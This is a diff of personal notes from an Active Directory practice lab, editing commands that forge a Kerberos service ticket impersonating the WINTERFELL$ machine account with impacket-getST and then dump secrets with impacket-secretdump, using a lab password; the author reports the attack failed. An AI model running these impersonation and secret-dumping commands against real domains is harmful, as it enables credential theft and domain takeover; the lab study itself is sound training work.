@@ -72,6 +72,7 @@ We can see that the user of the `WINTERFELL` machine is `WINTERFELL$` so this is
   ![[images/2026-10-08_17-02-37.png]]
 
 ```bash
+  # With the altservice, so we can change the rights access of the ST from CIFS to HOST. 
   impacket-getST -spn CIFS/winterfell.north.sevenkingdoms.local \
       -altservice HOST/winterfell.north.sevenkingdoms.local \
       -impersonate WINTERFELL$ \
@@ -79,7 +80,7 @@ We can see that the user of the `WINTERFELL` machine is `WINTERFELL$` so this is
       -dc-ip 10.2.10.11
 ```
 ```bash
-
+  # Without altservice so we keep the CIFS rights of the ST.
   impacket-getST -spn cifs/winterfell.north.sevenkingdoms.local \
       -impersonate WINTERFELL$ \
       north.sevenkingdoms.local/jon.snow:iknownothing \
@@ -93,7 +94,7 @@ We are prompted with the `jon.snow` password and successfully get the ST for the
 Now let's try to dump the secrets !
 
 ```bash
-impacket-secretdump    north.sevenkingdoms.local/WINTERFELL$@winterfell.north.sevenkingdoms.local -k -no-pass
+  impacket-secretdump 'north.sevenkingdoms.local/WINTERFELL$@winterfell.north.sevenkingdoms.local' -k -no-pass
 ```
 
 It didn't work. I have the same weird error.
@@ -116,12 +117,10 @@ Ok so we can use the `CIFS/winterfell.north.sevenkingdoms.local` to request a ST
 ```
 
 
-
-
 # TLDR
 > **warning** Warning
 > So it didn't work, not because of my commands. My AD is broken or I don't what is wrong. But these commands work, I checked the writeups to be sure and this is what they did.
 
-  ![[images/2026-10-09_14-46-29.png]]
-  
+![[images/2026-10-09_14-46-29.png]]
+
 I gave up.
